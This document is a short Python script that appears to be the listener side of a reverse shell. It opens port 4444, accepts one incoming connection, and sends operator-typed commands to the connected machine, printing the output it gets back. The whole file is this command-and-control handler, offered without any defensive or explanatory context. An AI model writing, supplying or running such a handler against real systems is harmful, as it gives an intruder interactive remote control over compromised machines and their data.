import socket as s
from os import system
from sys import stdout,exit
from commands import commands

def closeConnection():
    client.close()
    sock.close()
    exit(1)

host = ''
port = 4444

system('clear')
print("Server listening on port", port)

sock = s.socket(s.AF_INET, s.SOCK_STREAM)
sock.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)
sock.bind((host, port))
sock.listen()

client, address = sock.accept()
print(f"Client connected from {address[0]}:{address[1]}")

while client:
    try:
        cmd = input('~ $ ').strip()
        if not cmd:
            print("\nType 'help' to see available commands\n", flush=True)
            continue
        
        if cmd == 'exit':
            closeConnection()

        client.send(cmd.encode())
        recv_output = client.recv(1024).decode().strip()

        if recv_output:
            print(recv_output, flush=True)
            stdout.flush()
        else:
            print("No output received")
    except KeyboardInterrupt:
        print("\nServer stopped...")
        client.close()
        sock.close()
        break
    except Exception as e:
        print(f"Error: {e}")
        client.close()
        sock.close()
        break
